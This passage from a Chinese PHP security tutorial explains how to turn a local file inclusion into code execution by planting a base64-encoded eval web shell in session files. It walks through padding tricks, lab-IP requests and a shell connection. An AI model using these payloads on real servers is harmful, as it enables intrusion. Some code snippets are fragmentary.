解码过程可以参考上图，逆向理解：`“QUJDRA==” ——>“ABCD”`
**（2）base64解码特点**
base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。下面编写一个简单的代码，测试一组数据看是否满足我们所说的情况。
  * **测试代码**
探测base64_decode解码的特点
    mro%otQftm";
    $basestr4="Qf%%%tmroo%%%tQftm";
    echo base64_decode($basestr0)."n";
    echo base64_decode($basestr1)."n";
    echo base64_decode($basestr2)."n";
    echo base64_decode($basestr3)."n";
    echo base64_decode($basestr4)."n";
    ?>
  * 运行结果
从结果中可以看到一个字符串中，不管出现多少个特殊字符或者位置上的差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
**Bypass base64_encode**
了解了base64编码原理之后和解码的特点，怎么让base64解码和编码的因果关系对照上，其实就很简单了，我们只要让session文件中base64编码的前面这一部分`username|s:40:"`正常解码就可以，怎么才能正常解码呢，需要满足base64解码的原理，就是4个字节能够还原原始的3个字节信息，也就是说session前面的这部分数据长度需要满足4的整数倍，如果不满足的话，就会影响session后面真正的base64编码的信息，也就导致上面出现的乱码情况。
**Bypass分析判断**
正常情况下base64解码包含`serialize_handler=php`处理过的原始session信息，未能正常解析执行
    username|s:40:"PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=";
    ?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl
依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，`username|s:1:"`这部分数据长度为14，实际解码为`usernames1`，实际长度为10，不满足情况。
4组解码->缺少两个字节，后面需占两位（`X` 代表占位符）
    username|s:1:"  //原始未处理信息
    user name s1XX  //base64解码特点，去除特殊字符，填充两个字节'XX'
当session存储的信息中用户名编码后的长度为两位数时，`username|s:11:"`这部分数据长度为15，实际解码为`usernames11`，实际长度为11，不满足情况。
4组解码->缺少一个字节，后面需占一位
    username|s:11:"   //原始未处理信息
    user name s11X   //base64解码特点，去除特殊字符，填充一个字节'X'
当session存储的信息中用户名编码后的长度为三位数时，`username|s:111:"`这部分数据长度为16，实际解码为`usernames111`，长度为12，满足情况。
4组解码->缺少零个字节，后面需占零位
    username|s:11:"   //原始未处理信息
    user name s111  //base64解码特点，去除特殊字符，填充0个字节'X'
这种情况下刚好满足，即使前面这部分数据正常解码后的结果是乱码，也不会影响后面恶意代码的正常解码。
再次构造payload
    POST：
    username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm
先测试payload编码后的长度是否满足构造需求
base64编码
    cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=
编码测长
结果中可以看到payload满足长度的需求。
**Bypass攻击利用**
分析怎么绕过之后，可以构造payload传入恶意session
    http://192.33.6.145/FI/session/session.php
    POST：
    username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm
然后构造payload包含恶意session
    http://192.33.6.145/FI/index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl
    POST：
    mtfq=phpinfo();
从相应结果中可以看到，在PHP默认的会话处理模式`serialize_handler=php`下，我们这次构造的payload成功解析了，达到了预期的目的。
**Getshell**
尝试蚁剑连接我们session中传入的恶意代码
从连接情况上看，后门代码的运行是正常的没有出现问题。
###  Bypass serialize_handler=php_serialize
看到这里可能有人会想上面默认处理的是`session.serialize_handler =
php`这种模式，那么针对`session.serialize_handler =
php_serialize`这种处理方式呢，答案是一样的，只要能构造出相应的`payload`满足恶意代码的正常解码就可以。
**测试代码**
**session.php**
     $username";
    ?>
**Bypass分析判断**
正常情况下base64解码包含`serialize_handler=php_serialize`处理过的原始session信息，未能正常解析执行
    a:1:{s:8:"username";s:40:"PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=";}
    ?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s
这中模式下的分析，和上面Bypass分析的手段是一样的，同样依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，`a:1:{s:8:"username";s:1:"`这部分数据长度为25，实际解码为`a1s8usernames1`，实际长度为14，不满足情况。
4组解码->缺少两个字节，后面需占两位（`X` 代表占位符）
    a:1:{s:8:"username";s:1:"  //原始未处理信息
    a1s8 user name s1XX  //base64解码特点，去除特殊字符，填充两个字节'XX'
当session存储的信息中用户名编码后的长度为两位数时，`a:1:{s:8:"username";s:11:"`这部分数据长度为26，实际解码为`a1s8usernames11`，实际长度为15，不满足情况。
4组解码->缺少一个字节，后面需占一位
    a:1:{s:8:"username";s:11:"   //原始未处理信息
    a1s8 user name s11X   //base64解码特点，去除特殊字符，填充一个字节'X'
当session存储的信息中用户名编码后的长度为三位数时，`a:1:{s:8:"username";s:11:"`这部分数据长度为27，实际解码为`a1s8usernames111`，长度为16，满足情况。
4组解码->缺少零个字节，后面需占零位
    a:1:{s:8:"username";s:111:"  //原始未处理信息
    a1s8 user name s111  //base64解码特点，去除特殊字符，填充0个字节'X'
这种情况下刚好满足，即使前面这部分数据正常解码后的结果是乱码，也不会影响后面恶意代码的正常解码。
构造payload
    POST：
    username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm
先测试payload编码后的长度是否满足构造需求
base64编码
    cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=
编码测长
结果中可以看到payload满足长度的需求。
**Bypass攻击利用**
再次构造payload传入恶意session
    http://192.33.6.145/FI/session/session.php
    POST：
    username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm
然后构造payload包含向服务器生成的恶意session
    http://192.33.6.145/FI/session/index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s
    POST：
    mtfq=phpinfo();
从相应结果中可以看到，这种模式下`session.serialize_handler =
php_serialize`，我们构造的payload也成功的解析了，同样达到了预期的目的。
**Getshell**
尝试蚁剑连接我们session中传入的恶意代码
## No session_start()
###  phpinfo session
一般情况下，`session_start()`作为会话的开始出现在用户登录等地方以维持会话，但是，如果一个站点存在`LFI`漏洞，却没有用户会话那么该怎么去包含session信息呢，这个时候我们就要想想系统内部本身有没有什么地方可以直接帮助我们产生session并且一部分数据是用户可控的，很意外的是这种情况存在，下面分析一下怎么去利用。
想要具体了解session信息就要熟悉session在系统中有哪些配置。默认情况下，`session.use_strict_mode`值是0，此时用户是可以自己定义`Session
ID`的。比如，我们在Cookie里设置`PHPSESSID=Qftm`，PHP将会在服务器上创建一个文件：`/var/lib/php/sessions/sess_Qftm`。
但这个技巧的实现要满足一个条件：服务器上需要已经初始化Session。
在PHP中，通常初始化Session的操作是执行session_start()。所以我们在审计PHP代码的时候，会在一些公共文件或入口文件里看到上述代码。那么，如果一个网站没有执行这个初始化的操作，是不是就不能在服务器上创建文件了呢？很意外是可以的。下面看一下php.ini里面关键的几个配置项
`session.auto_start`：顾名思义，如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。
`session.upload_progress.enabled = on`：默认开启这个选项，表示`upload_progress`功能开始，PHP
能够在每一个文件上传时监测上传进度。
这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。
`session.upload_progress.cleanup =
on`：默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。
`session.upload_progress.prefix = "upload_progress_"`：
`session.upload_progress.name =
"PHP_SESSION_UPLOAD_PROGRESS"`：当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）,